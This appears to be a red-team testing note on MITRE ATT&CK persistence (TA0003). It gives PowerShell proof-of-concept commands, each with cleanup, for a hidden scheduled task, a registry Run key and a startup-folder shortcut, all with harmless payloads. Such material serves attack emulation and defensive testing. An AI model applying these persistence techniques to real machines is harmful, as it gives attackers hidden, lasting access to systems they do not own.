# TA0003 - Persistence

*- maintaining access.*

## T1053.005 - Scheduled Task/Job: Scheduled Task

- Execute `$cmd` every minute.
    - Attack:
        ```ps1
        $cmd = "PowerShell -WindowStyle Hidden -Command taskschd.msc"
        SCHTASKS /Create /F /SC MINUTE /MO 1 /TN poc /TR $cmd
        ```
    - Cleanup:
        ```ps1
        SCHTASKS /Delete /F /TN poc
        ```

## T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

- Execute `$cmd` (via registry run key) when current user logins.
    - Attack:
        ```ps1
        $cmd = "PowerShell -NoExit -Command REG QUERY HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /F /V poc /D $cmd
        ```
    - Cleanup:
        ```ps1
        REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /F /V poc
        ```

- Execute `$cmd` (via startup folder) when current user logins.
    - Attack:
        ```ps1
        $cmd = "Explorer $env:HOMEPATH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        $cmds = $cmd -split ' ', 2 ; $lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk") ; $lnk.TargetPath = $cmds[0] ; $lnk.Arguments = $cmds[1] ; $lnk.Save()
        ```
    - Cleanup:
        ```ps1
        Remove-Item -Force -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\poc.lnk"
        ```

## Resources

- [Mitre ATT&CK | Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Red Team Notes | Persistence](https://dmcxblue.gitbook.io/red-team-notes/persistence/)
